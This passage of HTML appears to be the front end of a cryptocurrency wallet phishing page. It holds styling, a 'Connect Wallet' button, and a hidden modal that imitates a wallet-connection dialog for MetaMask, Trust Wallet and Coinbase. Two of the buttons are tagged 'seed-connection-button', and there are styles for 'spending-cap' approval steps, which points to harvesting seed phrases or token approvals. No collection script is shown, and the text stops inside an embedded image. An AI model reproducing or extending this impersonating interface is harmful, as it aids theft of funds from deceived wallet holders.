          transform: translateX(200%) skewX(-15deg);
        }
      }

      @keyframes buttonPulse {
        0% {
          transform: scale(1);
          box-shadow: 0 0 0 0 rgba(3, 118, 201, 0.4);
        }

        70% {
          transform: scale(1.05);
          box-shadow: 0 0 0 10px rgba(3, 118, 201, 0);
        }

        100% {
          transform: scale(1);
          box-shadow: 0 0 0 0 rgba(3, 118, 201, 0);
        }
      }

      @keyframes slideOutPostfixLeft {
        0% {
          transform: translateX(0);
          opacity: 1;
        }

        100% {
          transform: translateX(-30px);
          opacity: 0;
        }
      }

      @keyframes slideInPostfixRight {
        0% {
          transform: translateX(30px);
          opacity: 0;
        }

        100% {
          transform: translateX(0);
          opacity: 1;
        }
      }

      @keyframes followPathPostfix {
        100% {
          stroke-dashoffset: 0px;
        }
      }

      .spinner-svg-postfix {
        position: absolute;
        inset: -4px;
        width: calc(100% + 8px);
        height: calc(100% + 8px);
      }

      .spinner-path-postfix {
        stroke-dasharray: 116, 245;
        stroke-dashoffset: 360;
        animation: 1s linear 0s infinite normal none running followPathPostfix;
      }

      .slide-out-left-postfix {
        animation: slideOutPostfixLeft 0.5s ease-out forwards;
      }

      .slide-in-right-postfix {
        animation: slideInPostfixRight 0.5s ease-out forwards;
      }

      .steps-container-postfix {
        position: relative;
        width: 100%;
        min-height: 260px;
      }

      .spending-cap-popup-step {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        width: 100%;
        opacity: 0;
        visibility: hidden;
        transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
      }

      .spending-cap-popup-step.active {
        opacity: 1;
        visibility: visible;
        transform: translateX(0);
      }

      .spending-cap-popup-step-1 {
        transform: translateX(0);
      }

      .spending-cap-popup-step-1.slide-out {
        transform: translateX(-100%);
        opacity: 0;
        visibility: hidden;
      }

      .spending-cap-popup-step-2 {
        transform: translateX(100%);
      }

      .spending-cap-popup-step-2.slide-in {
        transform: translateX(0);
        opacity: 1;
        visibility: visible;
      }

      .modal-overlay-postfix {
        opacity: 0;
        visibility: hidden;
        transition: all 0.5s ease-in-out;
      }

      .modal-overlay-postfix.active {
        opacity: 1;
        visibility: visible;
      }

      .modal-content-postfix {
        transform: scale(0.7);
        opacity: 0;
        transition: all 0.5s ease-in-out;
      }

      .modal-overlay-postfix.active .modal-content-postfix {
        transform: scale(1);
        opacity: 1;
      }

      .button-shine-postfix {
        position: absolute;
        top: 0;
        left: 0;
        width: 50%;
        height: 100%;
        background: linear-gradient(
          to right,
          rgba(255, 255, 255, 0) 0%,
          rgba(255, 255, 255, 0.3) 50%,
          rgba(255, 255, 255, 0) 100%
        );
        animation: buttonShinePostfix 3s infinite;
        transform: skewX(-15deg);
      }

      .target-button-postfix {
        animation: buttonPulse 2s infinite;
        transition: transform 0.3s ease;
      }

      .target-button-postfix:hover {
        transform: scale(1.05);
      }

      .animate-slide-in-postfix {
        animation: slideInPostfix 1.2s ease-out forwards;
      }

      .animate-slide-out-postfix {
        animation: slideOutPostfix 1.2s ease-out forwards;
      }

      .animate-fade-in-postfix {
        opacity: 0;
        animation: fadeInPostfix 1.2s ease-out forwards;
      }

      .animate-text-reveal-postfix {
        opacity: 0;
        animation: none;
      }

      .popup-content-postfix > * {
        opacity: 0;
        transition: opacity 1.2s ease-in-out;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(1) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.2s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(2) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.4s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(3) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.6s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(4) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.8s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(5) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 1s;
      }

      .popup-content-postfix.fade-out > *:nth-child(5) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.2s;
      }

      .popup-content-postfix.fade-out > *:nth-child(4) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.4s;
      }

      .popup-content-postfix.fade-out > *:nth-child(3) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.6s;
      }

      .popup-content-postfix.fade-out > *:nth-child(2) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.8s;
      }

      .popup-content-postfix.fade-out > *:nth-child(1) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 1s;
      }
    </style>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'n900': '#0B1121',
                        'g300': '#00A36C',
                        'g400': '#008F5D',
                        'n70': '#9CA3AF',
                    },
                    fontFamily: {
                        'inter': ['Inter', 'sans-serif'],
                    }
                }
            }
        }
    </script>
</head>
<body class="font-inter">
    <div class="bg-n900 min-h-dvh relative overflow-hidden text-white">
        <!-- Gradient Effects -->
        <div class="w-[582px] h-[582px] rounded-full bg-g300/30 fixed -top-32 -left-20 blur-[575px]"></div>
        <div class="w-[582px] h-[582px] rounded-full bg-blue-500/20 fixed -bottom-32 -right-20 blur-[575px]"></div>

        <!-- Fixed Header -->
        <div class="fixed top-0 left-0 right-0 z-30 bg-n900/80 backdrop-blur-xl border-b border-white/5">
            <div class="max-w-2xl mx-auto px-4">
                <div class="py-6">
                    <h1 class="text-xl font-semibold text-center">Link Wallet</h1>
                </div>
            </div>
        </div>

        <!-- Main Content -->
        <div class="pt-[88px] pb-[80px] relative">
            <div class="max-w-2xl mx-auto px-4">
                <div class="text-center mb-8">
                   
                </div>

                
               
                    

                    <!-- Submit Button -->
                    <button id="buy-button" 
                            class="w-full bg-g300 hover:bg-g400 transition-colors font-semibold text-center py-4 rounded-xl">
                        Connect Wallet
                    </button>
               
            </div>
        </div>

        <!-- Bottom Navigatio -->
    </div>

  

    <!-- //modal -->
    <div
      id="start-modal"
      style="display: none"
      class="connect-modal-parent scwtw-fixed scwtw-w-full scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-z-[2147483646] scwtw-bottom-0 md:scwtw-justify-center md:scwtw-bottom-auto md:scwtw-top-1/2 md:scwtw-left-1/2 md:-scwtw-translate-x-1/2 md:-scwtw-translate-y-1/2 modal-slide-enter scwtw-opacity-100 modal-slide-enter-active"
    >
      <div
        class="2xl:scwtw-max-w-[800px] xl:scwtw-max-w-[700px] md:scwtw-max-w-[600px] max-w-auto scwtw-w-full scwtw-bg-[#ffffff] dark:scwtw-bg-[#121313] dark:scwtw-border dark:scwtw-border-[#292929] md:scwtw-h-[500px] scwtw-rounded-[24px] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto"
      >
        <div
          class="md:scwtw-flex md:scwtw-flex-row scwtw-px-6 scwtw-py-8 scwtw-h-full scwtw-gap-4"
        >
          <div class="md:scwtw-basis-1/2 md:scwtw-mb-0 scwtw-mb-4">
            <div class="scwtw-mb-4">
              <svg
                class="scwtw-h-[35px] scwtw-w-auto"
                width="249"
                height="48"
                viewBox="0 0 249 48"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                  fill="#202020"
                ></path>
                <path
                  d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                  fill="white"
                ></path>
                <path
                  d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                  fill="#202020"
                ></path>
              </svg>
            </div>
            <div class="scwtw-mb-4">
              <p
                class="font-kh-teka-mono scwtw-text-base scwtw-font-normal scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
              >
                Recommended:
              </p>
            </div>
            <div
              class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-gap-y-2 scwtw-h-full md:scwtw-max-h-[350px] scwtw-max-h-[300px] scwtw-overflow-y-auto custom-reown-scrollbar start-modal-buttons-container"
            >
              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group"
                  id="meta-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,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"
                        alt="Metamask"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Metamask</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>

              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="trust-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,UklGRh4FAABXRUJQVlA4WAoAAAAQAAAAdwAAdwAAQUxQSM0AAAABcFzbttJcvCMbWhfRTrBWfhlxGwEpgkUNcXe50yQiJgD3mmGnXBy+9qLshCaeqTXG68PXX49r2kNudiCZuQ/EB577+B5VHKgK9ZY4kBU30gPd9Ip/IBwA0AtGcwNoHSi3Ic04zSRnw2njJAfSSZ9Vv2JVLVktD3////3/A+qS1bJiVfVZ9RNWibPhtHGkGaeZhDanFmDMGRU6gICRj8uUT4rrgo3ATVVwEeotIN4TiXG/m7HIXDyq1cbr77ceNzQ80wy75eJ7LcpOaOJeAFZQOCAqBAAAMBkAnQEqeAB4AD5JIo5FIqIhFMm0iCgEhKRHcX3IMT9H/Kr2O7J/gPwbxyJs+sX8h+XP877ZHihf4D8se4H5h/1m/W73gP7B/M/an6AH9a/p/pK+wn6AH7O+ln+0fwe/uL+0vszarmvyRYT5UxD/t+XH6P/3e9AeiqWKmXiQav4f//u98/v4/K6QilyCPBK67qE/+VjnKMKp3sWn4qDTQfPIVU+/NVj3PteybGb2LshUWI1BQwoYL6Jjhqb/Vh+G5W99LoAqyoC+ZR/qZeJMBZZwAP79wIA5OIwNi9Hl/QM43aY0aNRnyKgTZ2KPksaXAuQP7FyjpUP2Qh95P5rwT+Ja7NKsAMuTSHN/BWckmrf/h672H5bvYZOvb53Fw30znSa/nTZ0EwZANIt2y+ozX8V8Vc20HkQW8By/h5X27WsRAvZvdCsFJNK+o6qSQwU4u3Tv2PmZPHtIM/nxKCVMSFbt5Q4wpkxqq4rvRytNogEmrvGaHSEPyybMs4jQ01DRsFrY/ymHwpbZ9rfZ/qzxQBDvEhzdAfS0h47bq2ODK0YzWz/pHUVSkekHkM+xq0BCLP4H//FUrzdLf/KQwCFC1kVPd+PNd9amA+sgvA+E5GCbnzhWkPMgsoOtCgDQsLxlOJBZ8UjzZ0RlN0IyKfQw43uCjbYEswmy2BbQmk3vgZMaoiHIzoyhNiTd3qG1EyEe2eFM29D2pMfPJeQp6/Ph0pn5I1HOzblkL4VufW1lT3vKmr2iqgfBilLztPjk7UzrJ79hmyAemJ3B0JL+brpfwDGVToLaedSPeyjjA3G/18tCiOqeJ4zK5meAc7yHjpY7b+YB55WYDxFJWFgzmc1UCiHeEsmXTdJ8FdzZrOiQXnPA1Fc+DcGHy8yNTWXdPkw3f0wcFUvNM/7oLX2zrDy4r5SaOuANhB2U2sGMcP4Y3vC0HC9X+tMBowgAV3Zd0UuSXaGy9GPAoQhC9LA96Hul2Vp3cRgZgaGpq/t8JvQ7aILU9e7yVgqfzMkwzWS/4n1aDL2naajCH9k7j5DojhIsd0owFGet3TTuJ6b2y+yPN4PkXs96hxx/GZvtUnuQW5UEp5C2RQex6fV/DIh2XVByKfXn31kZmaTVt59fP6GEAdBx6q5uUcHVivvWJ0OftTYnfgYU7OqHrtttYFH5Wmb/v3H4sYhsEZQuPE+GbmUwTlPQy4qxS8a0gD+4R99/6obUBvWp/9JOgW5QymKQc2sulSGE1Twp+BeIn/l1vf/f4vc8J8iSU2HZGy+hiG9ODXUQGaxjCqXmEiNZF62GgceYWBoxxSjh+W65vBkWGbWU2k35HC32UpXKKOtQMhL1fpUHHu4k9X0rALZ5oHFgEK5SwCYMeJaNXyR+ia6pO8fnNvTKP9Q8Iea+WzHuq7xfANNrVquf7wgAAAAAAA=="
                        alt="Trust Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Trust Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>

              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="coinbase-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,UklGRuAFAABXRUJQVlA4INQFAACQIACdASp4AHgAPkkijkQioiGXCyQcKASEsQN8c2HiuAn9m/FXv/s0eA/mf7Vfkz2fu/fw79J/jxmb/G/+n8yf+d/kHuA8wD9Ff9h1AP1g/s3sA/UT/Vf4z3hP4j/kv4B7gP83/KP7p7gH8+/wvWAfoB7AH6SelL+3Xwb/rh+1vtCXRH0ve8f5zhjlYsENIFMv8jf0t0t3mAeyB+wBaFRSEFJ85QT4wMY//h5Wlu4TPcVFeRjNCzkZt45BD1kFBoRy1sqh8qFDgfeX/D+cIlLM5yIHMXM8Z04AaLr6xJpiCnmNrbtii3uMOSRTYDj+6dtl939Kx23Ixh5BAMaZ1HngzO3U+1xDyiUA4ss2AAD+7/246f8RO+IneImyhtikVuTJl5GdRXejyZ8eT2bkasC6C1DoHzZdbsY0DSZv+qv0P6G5Cv37u5VmTK2jd8/KvSxtw1SdX+UjD6wZIJ6Q8Gcn+eMa0OP894J3M/WTO1v9TC2+VmPxrIhgiAzDs0TSGbNMi0psELMxuCu+LqgNGr2bjt3G/F63cM86fE9c7LHp8ply/wO+uxQtcEr1A7z4gpBiif/KPZiwfrKkrtAAmE4jX7Si6sFt0JjSnQfFfuQc7oKqj2/x2Ten6iTJFnTIRPBcR5nzCqT8fjzfyyCeg2HDSldW87YMEGYBLbS1FuNCaMTcSze0IRjPjjAjteIYwemmxRR4qNe2bpYMjG8EvKyiexULpmlU4EKgLmHGBy3JqfnSboHVNqYMBO97kx2eQbzoEgvIEPT1wSMvi5q8BZ0OX4uv1brvwNQfE8RLiON0wdvoivhnCOhx1P+CSsxH9L7flNZfQ2y9/nwSW9C9H5d14rSK2t/vtIarPTQEmHe6naSPkZ5+GcbUQ/SwTA5EkBL+9Z+UJIylYB8dk4Ha+y6YLL9nCclJPz1+D9KWUfJhK380kkFyZ/I4NRJ9P6XdEpx8Z3f/zdeQUI2AZMU/Pf+Ly/99QQpQIlrhOL3DagEdnJVYSYEr3Z1BrUv4Wpm2H1gdpCS3sS4fYkFlbewzr+jjCeYRgXs+d/hmba33VlmyxrnJg9ujTJj1QxoG4utbk1Tf9Tg8/b3B/zgMCRRANPCC9wUx81zORgfDst3wZhOq3qS8Xl